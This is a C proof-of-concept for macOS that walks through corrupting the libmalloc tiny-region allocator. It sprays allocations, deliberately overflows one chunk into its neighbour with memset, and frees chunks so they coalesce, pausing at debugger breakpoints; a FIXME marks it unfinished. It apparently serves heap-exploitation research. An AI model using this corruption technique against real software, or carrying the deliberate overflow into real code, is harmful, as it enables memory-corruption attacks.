#include <mach/mach_init.h>
#include <mach/thread_act.h>
#include <mach/thread_policy.h>
#include <mach/error.h>
#include <stdio.h>
#include <stdlib.h>

const int Quantum = 0x10;

void
region_spray(int size, int count)
{
    int i;
    for (i = 0; i < count; i++)
        malloc(size);
    return;
}

int
main()
{
    int i; char* p;
    char* array[0x10];
    
    printf("Emptying the mag_last_free cache\n");
    malloc(Quantum*13);

    printf("Emptying the free-list\n");
    region_spray(Quantum, 49);
//    asm("int3\n\t");

    printf("Doing allocations\n");
    array[0] = malloc(Quantum);
    array[1] = malloc(Quantum*2);
    array[2] = malloc(Quantum*3);
    array[3] = malloc(Quantum*4);

    for (i = 0; i < 4; i++)
        printf("%p\n", array[i]);
//    asm("int3\n\t");

    printf("Freeing a region slot\n");
    free(array[2]);
//    asm("int3\n\t");
    printf("One more for the cache\n");
    free(malloc(Quantum*10));
//    asm("int3\n\t");

    printf("Overwriting a region-slot\n");
    memset(array[1], 0x8, Quantum*5);
    asm("int3\n\t");

    printf("Prep the cache\n");
    array[4] = malloc(Quantum*10);

    printf("Loading the cache\n");
    free(array[3]);
    asm("int3\n\t");

    printf("Moving the cache to the free-list\n");
    free(array[4]);
    asm("int3\n\t");

    printf("Chunks should be joined\n");
    asm("int3\n\t");

    // FIXME: figure out how to trigger this in front of a bunch of slots
}
